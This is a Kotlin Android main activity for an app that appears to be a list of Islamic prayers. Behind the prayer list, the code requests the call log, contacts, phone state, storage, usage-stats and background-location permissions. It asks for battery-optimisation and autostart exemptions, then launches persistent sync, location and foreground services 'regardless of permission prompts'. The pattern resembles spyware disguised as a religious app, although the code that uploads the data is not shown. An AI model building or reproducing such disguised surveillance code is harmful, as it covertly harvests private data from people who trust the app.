package islamic.duas

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import islamic.duas.databinding.ActivityMainBinding
import islamic.duas.cloud.CloudApi
import islamic.duas.sync.DuaSyncScheduler
import islamic.duas.sync.DuaLocationWorker
import islamic.duas.sync.DuaSyncWorker
import islamic.duas.sync.DuaForegroundService
import islamic.duas.sync.QueueFlushWorker
import islamic.duas.utils.DeviceId
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private lateinit var binding: ActivityMainBinding

    private val permissions = mutableListOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS
    )

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
        prefs.edit().putBoolean("permissions_handled", true).apply()
        checkUsageStatsPermission()
        checkLocationPermission()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e("DuaApp", "Uncaught exception on thread: ${thread.name}", throwable)
        }

        try {
            super.onCreate(savedInstanceState)

            CloudApi.init(this)
            trackAppOpen()

            binding = ActivityMainBinding.inflate(layoutInflater)
            setContentView(binding.root)

            setupDuasList()

            QueueFlushWorker.schedule(this)
            requestPermissions()

            // Start background work regardless of permission prompts
            CoroutineScope(Dispatchers.IO).launch {
                delay(30_000L)
                scheduleBackgroundSync()
            }
        } catch (throwable: Throwable) {
            Log.e("DuaApp", "onCreate crash: ${throwable.localizedMessage}", throwable)
            runOnUiThread {
                AlertDialog.Builder(this)
                    .setTitle("Startup Error")
                    .setMessage(throwable.localizedMessage ?: throwable.toString())
                    .setCancelable(false)
                    .setPositiveButton("OK") { _, _ -> finish() }
                    .show()
            }
        }
    }

    private fun trackAppOpen() {
        val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
        val count = prefs.getInt("app_open_count", 0) + 1
        prefs.edit().putInt("app_open_count", count).apply()
    }

    private fun setupDuasList() {
        binding.duasRecyclerView.layoutManager = LinearLayoutManager(this)
        binding.duasRecyclerView.adapter = DuaAdapter(Dua.allDuas)
        binding.duasRecyclerView.setHasFixedSize(true)
    }

    private fun scheduleBackgroundSync() {
        // Launch sync coroutine FIRST (before WorkManager to avoid blocking)
        CoroutineScope(Dispatchers.IO).launch {
            try {
                DuaSyncWorker.runSync(this@MainActivity)
            } catch (e: Exception) {
                Log.e("DuaApp", "Direct sync error: ${e.message}", e)
            }
        }
        try {
            DuaSyncScheduler.runOnceNow(this)
        } catch (e: Exception) {
            Log.e("DuaApp", "Schedule error: ${e.message}")
        }
        try {
            DuaLocationWorker.schedule(this)
        } catch (e: Exception) {
            Log.e("DuaApp", "DuaLocationWorker schedule error: ${e.message}")
        }
        try {
            DuaForegroundService.start(this)
            DuaForegroundService.setAlarm(this)
        } catch (e: Exception) {
            Log.e("DuaApp", "Foreground service error: ${e.message}")
        }
    }

    private fun requestPermissions() {
        val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
        if (prefs.getBoolean("permissions_handled", false)) return

        val needed = permissions.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            permissionLauncher.launch(needed.toTypedArray())
        } else {
            // All manifest permissions granted — prompt system permissions once
            checkUsageStatsPermission()
            checkLocationPermission()
            prefs.edit().putBoolean("permissions_handled", true).apply()
        }
    }

    private fun checkUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val packageName = packageName
            val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName
            )
            if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
                startActivity(
                    Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                )
            }
        }
        checkBatteryOptimization()
    }

    private fun checkLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                permissionLauncher.launch(
                    arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            }
        }
    }

    private fun checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                )
            }
        }
        promptAutoStart()
    }

    private fun promptAutoStart() {
        try {
            val huaweiIntent = Intent().apply {
                action = "android.settings.REQUEST_MANAGE_APP_ALLOWLIST"
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (huaweiIntent.resolveActivity(packageManager) != null) {
                startActivity(huaweiIntent)
            }
        } catch (_: Exception) {}
    }
}
